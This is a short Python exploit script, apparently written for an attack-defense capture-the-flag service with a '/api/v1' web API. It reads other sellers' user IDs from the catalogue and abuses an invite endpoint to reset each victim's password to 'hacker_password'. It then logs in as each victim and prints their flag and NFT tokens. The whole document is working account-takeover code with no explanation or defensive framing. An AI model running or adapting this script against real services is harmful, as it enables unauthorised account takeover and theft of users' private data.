import requests
import sys

HOST = sys.argv[1]
PORT = '8080'
hint = sys.argv[2]
URL = f'http://{HOST}:{PORT}'

with requests.Session() as s:
    user = {"username" : hint, "password" : "hacker_password"}
    s.post(f'{URL}/api/v1/register', json=user)
    s.post(f'{URL}/api/v1/login', json=user)
    resp = s.post(f'{URL}/api/v1/catalogue', json={"page": 1, "limit" : 5})
with requests.Session() as s2: 
    for m in resp.json()["rows"]:
        user = {"ID": m["user_id"], "username" : m["seller"], "password" : "hacker_password"}
        s2.post(f'{URL}/api/v1/invite', json=user)
        resp = s2.post(f'{URL}/api/v1/login', json=user)
        resp = s2.get(f'{URL}/api/v1/profile')
        print(resp.json()["flag"])
        for i in resp.json()["merchandise"]:  
            print(i['NFTToken'])